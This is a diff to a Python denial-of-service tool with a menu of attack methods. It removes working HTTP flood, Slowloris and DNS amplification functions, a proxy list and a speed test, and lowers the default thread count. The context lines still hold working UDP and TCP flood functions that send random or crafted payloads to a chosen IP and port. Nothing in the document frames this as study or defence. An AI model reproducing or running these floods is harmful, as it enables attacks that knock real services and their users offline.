@@ -12,8 +12,6 @@ import csv
 from datetime import datetime
 from colorama import init, Fore, Style
 import requests
-from speedtest import Speedtest
-import dns.resolver
 
 # ASCII Art Color 
 
@@ -148,33 +146,6 @@ def get_ip_location(ip):
         pass
     return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'org': 'Unknown'}
 
-def test_connection_speed():
-    try:
-        print(Fore.CYAN + "[📊] Testing connection speed...")
-        st = Speedtest()
-        download_speed = st.download() / 1_000_000  # Convert to Mbps
-        upload_speed = st.upload() / 1_000_000  # Convert to Mbps
-        
-        print(Fore.GREEN + f"[✅] Download Speed: {download_speed:.2f} Mbps")
-        print(Fore.GREEN + f"[✅] Upload Speed: {upload_speed:.2f} Mbps")
-        
-        if upload_speed < 5:
-            print(Fore.YELLOW + "[⚠️] Warning: Low upload speed may affect attack effectiveness")
-        
-        return download_speed, upload_speed
-    except:
-        print(Fore.YELLOW + "[⚠️] Speed test unavailable")
-        return 0, 0
-
-# ============================================
-# PROXY & ANONYMITY FUNCTIONS
-# ============================================
-PROXY_LIST = [
-    'proxy1.example.com:8080',
-    'proxy2.example.com:3128',
-    # Add more proxies here
-]
-
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
@@ -184,11 +155,6 @@ USER_AGENTS = [
 
 def get_random_user_agent():
     return random.choice(USER_AGENTS)
-
-def get_random_proxy():
-    if PROXY_LIST:
-        return random.choice(PROXY_LIST)
-    return None
 
 # ============================================
 # ATTACK METHODS - ENHANCED WITH MULTI-THREADING
@@ -223,7 +189,7 @@ def udp_spam(ip, port, duration, packet_size, thread_id=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(0.5)
     end_time = time.time() + duration
-    local_packet_count = 1000
+    local_packet_count = 0
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Spam on {ip}:{port} | Size: {packet_size} bytes")
     
@@ -232,7 +198,7 @@ def udp_spam(ip, port, duration, packet_size, thread_id=1):
             payload = random.randbytes(packet_size)
             try:
                 sock.sendto(payload, (ip, port))
-                local_packet_count += 1000
+                local_packet_count += 0
                 stats.update(1, packet_size)
             except:
                 break
@@ -249,7 +215,7 @@ def udp_spam(ip, port, duration, packet_size, thread_id=1):
 def udp_handshake(ip, port, duration, packet_size, thread_id=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
-    local_packet_count = 1000
+    local_packet_count = 0
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Handshake on {ip}:{port}")
     
@@ -258,7 +224,7 @@ def udp_handshake(ip, port, duration, packet_size, thread_id=1):
             handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)
             try:
                 sock.sendto(handshake, (ip, port))
-                local_packet_count += 1000
+                local_packet_count += 0
                 stats.update(1, packet_size)
             except:
                 break
@@ -270,7 +236,7 @@ def udp_handshake(ip, port, duration, packet_size, thread_id=1):
 def udp_query(ip, port, duration, packet_size, thread_id=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
-    local_packet_count = 1000
+    local_packet_count = 0
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Query on {ip}:{port}")
     
@@ -279,7 +245,7 @@ def udp_query(ip, port, duration, packet_size, thread_id=1):
             query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)
             try:
                 sock.sendto(query, (ip, port))
-                local_packet_count += 1000
+                local_packet_count += 0
                 stats.update(1, packet_size)
             except:
                 break
@@ -291,7 +257,7 @@ def udp_query(ip, port, duration, packet_size, thread_id=1):
 # TCP Attack Methods
 def tcp_connect(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
-    local_connection_count = 1000
+    local_connection_count = 0
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Connect on {ip}:{port}")
     
@@ -302,7 +268,7 @@ def tcp_connect(ip, port, duration, packet_size, thread_id=1):
                 sock.settimeout(1)
                 result = sock.connect_ex((ip, port))
                 if result == 0:
-                    local_connection_count += 1000
+                    local_connection_count += 0
                     stats.update(1, 40)  # Approx TCP header size
                 sock.close()
             except:
@@ -316,7 +282,7 @@ def tcp_connect(ip, port, duration, packet_size, thread_id=1):
 
 def tcp_join(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
-    local_packet_count = 1000
+    local_packet_count = 0
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Join on {ip}:{port}")
     
@@ -328,7 +294,7 @@ def tcp_join(ip, port, duration, packet_size, thread_id=1):
                 sock.connect((ip, port))
                 handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)
                 sock.send(handshake)
-                local_packet_count += 1000
+                local_packet_count += 0
                 stats.update(1, packet_size)
                 sock.close()
             except:
@@ -338,7 +304,7 @@ def tcp_join(ip, port, duration, packet_size, thread_id=1):
 
 def tcp_login(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
-    local_packet_count = 1000
+    local_packet_count = 0
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Login on {ip}:{port}")
     
@@ -350,91 +316,8 @@ def tcp_login(ip, port, duration, packet_size, thread_id=1):
                 sock.connect((ip, port))
                 login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)
                 sock.send(login)
-                local_packet_count += 1000
+                local_packet_count += 0
                 stats.update(1, packet_size)
-                sock.close()
-            except:
-                pass
-    except Exception as e:
-        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
-
-# NEW ATTACK METHODS
-def http_flood(ip, port, duration, path="/", thread_id=1):
-    end_time = time.time() + duration
-    local_request_count = 1000
-    headers = {'User-Agent': get_random_user_agent()}
-    
-    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: HTTP Flood on {ip}:{port}")
-    
-    try:
-        while time.time() < end_time:
-            try:
-                response = requests.get(f"http://{ip}:{port}{path}", 
-                                      headers=headers, 
-                                      timeout=2,
-                                      verify=False)
-                local_request_count += 1000
-                stats.update(1, len(response.content))
-            except:
-                pass
-    except Exception as e:
-        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
-
-def slowloris_attack(ip, port, duration, thread_id=1):
-    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: Slowloris on {ip}:{port}")
-    
-    sockets = []
-    try:
-        # Create many sockets
-        for i in range(150):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                s.connect((ip, port))
-                s.send(f"GET / HTTP/1.1\r\n".encode())
-                sockets.append(s)
-                stats.update(1, 20)
-            except:
-                pass
-        
-        # Keep them open
-        start_time = time.time()
-        while time.time() - start_time < duration:
-            for s in sockets:
-                try:
-                    s.send(f"X-a: b\r\n".encode())
-                    time.sleep(10)  # Send header slowly
-                except:
-                    sockets.remove(s)
-            time.sleep(1)
-    except Exception as e:
-        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
-    finally:
-        # Close all sockets
-        for s in sockets:
-            try:
-                s.close()
-            except:
-                pass
-
-def dns_amplification(ip, duration, thread_id=1):
-    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: DNS Amplification targeting {ip}")
-    
-    dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9', '202.95.128.180']
-    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
-    query += b'\x07example\x03com\x00\x00\x01\x00\x01'
-    
-    end_time = time.time() + duration
-    local_packet_count = 1000
-    
-    try:
-        while time.time() < end_time:
-            dns_server = random.choice(dns_servers)
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(query, (dns_server, 53))
-                local_packet_count += 1000
-                stats.update(1, len(query))
                 sock.close()
             except:
                 pass
@@ -537,18 +420,16 @@ def show_main_menu():
     print("")
     print("  \033[90m[2]\033[97m \033[91mTarget Information\033[97m")
     print("")
-    print("  \033[90m[3]\033[97m \033[91mConnection Speed Test\033[97m")
+    print("  \033[90m[3]\033[97m \033[91mLoad/Save Configuration\033[97m")
     print("")
-    print("  \033[90m[4]\033[97m \033[91mLoad/Save Configuration\033[97m")
+    print("  \033[90m[4]\033[97m \033[91mView Previous Results\033[97m")
     print("")
-    print("  \033[90m[5]\033[97m \033[91mView Previous Results\033[97m")
-    print("")
-    print("  \033[90m[6]\033[97m \033[91mSettings & Whitelist\033[97m")
+    print("  \033[90m[5]\033[97m \033[91mSettings & Whitelist\033[97m")
     print("")
     print("  \033[90m[0]\033[97m \033[91mExit\033[97m")
     print("")
     
-    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect option (0-6): \033[92m").strip()
+    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect option (0-5): \033[92m").strip()
     return choice
 
 def show_attack_menu():
@@ -565,15 +446,10 @@ def show_attack_menu():
     print("  \033[90m[4]\033[97m \033[91mTCP Connect Flood\033[97m")
     print("  \033[90m[5]\033[97m \033[91mTCP Join Flood\033[97m")
     print("  \033[90m[6]\033[97m \033[91mTCP Login Flood\033[97m")
-    print()
-    print(Fore.YELLOW + "[ADVANCED ATTACKS]")
-    print("  \033[90m[7]\033[97m \033[91mHTTP GET Flood\033[97m")
-    print("  \033[90m[8]\033[97m \033[91mSlowloris Attack\033[97m")
-    print("  \033[90m[9]\033[97m \033[91mDNS Amplification\033[97m")
     print("  \033[90m[0]\033[97m \033[91mBack to Main Menu\033[97m")
     print()
     
-    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (0-9): \033[92m").strip()
+    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (0-6): \033[92m").strip()
     return choice
 
 def get_attack_parameters():
@@ -599,7 +475,7 @@ def get_attack_parameters():
     packet_size = validate_input("\033[97mPacket size in bytes (65500): \033[92m", 1, 65500, default=65500)
     
     # Thread count
-    thread_count = validate_input("\033[97mThread count (default 99999): \033[92m", 1, 99999, default=99999)
+    thread_count = validate_input("\033[97mThread count (default 100): \033[92m", 1, 100, default=100)
     
     return {
         'ip': ip,
@@ -616,10 +492,7 @@ def run_attack(method_choice, params):
         '3': (udp_query, "UDP Query Flood"),
         '4': (tcp_connect, "TCP Connect Flood"),
         '5': (tcp_join, "TCP Join Flood"),
-        '6': (tcp_login, "TCP Login Flood"),
-        '7': (http_flood, "HTTP GET Flood"),
-        '8': (slowloris_attack, "Slowloris Attack"),
-        '9': (dns_amplification, "DNS Amplification")
+        '6': (tcp_login, "TCP Login Flood")
     }
     
     if method_choice in attack_methods:
@@ -734,10 +607,15 @@ def show_settings():
     
     print()
     print(Fore.YELLOW + "[1] View Whitelist")
+    print("")
     print(Fore.YELLOW + "[2] Add to Whitelist")
+    print("")
     print(Fore.YELLOW + "[3] Remove from Whitelist")
+    print("")
     print(Fore.YELLOW + "[4] View Blacklist")
+    print("")
     print(Fore.YELLOW + "[5] Back to Main")
+    print("")
     
     choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect option: \033[92m").strip()
     
@@ -797,16 +675,15 @@ def main():
             show_target_info()
             
         elif choice == '3':
-            test_connection_speed()
-            input(Fore.CYAN + "\nPress Enter to continue...")
-            
-        elif choice == '4':
             print_banner()
             print(Fore.LIGHTBLUE_EX + "🔹  CONFIGURATION MANAGER  🔹")
             print()
             print(Fore.YELLOW + "[1] Save Current Settings")
+            print("")
             print(Fore.YELLOW + "[2] Load Saved Settings")
+            print("")
             print(Fore.YELLOW + "[3] Back")
+            print("")
             
             config_choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect: \033[92m").strip()
             
@@ -826,7 +703,7 @@ def main():
             
             input(Fore.CYAN + "\nPress Enter to continue...")
             
-        elif choice == '5':
+        elif choice == '4':
             if os.path.exists(RESULTS_FILE):
                 print_banner()
                 print(Fore.LIGHTBLUE_EX + "🔹  PREVIOUS RESULTS  🔹")
@@ -843,7 +720,7 @@ def main():
             
             input(Fore.CYAN + "\nPress Enter to continue...")
             
-        elif choice == '6':
+        elif choice == '5':
             show_settings()
 
 # ============================================
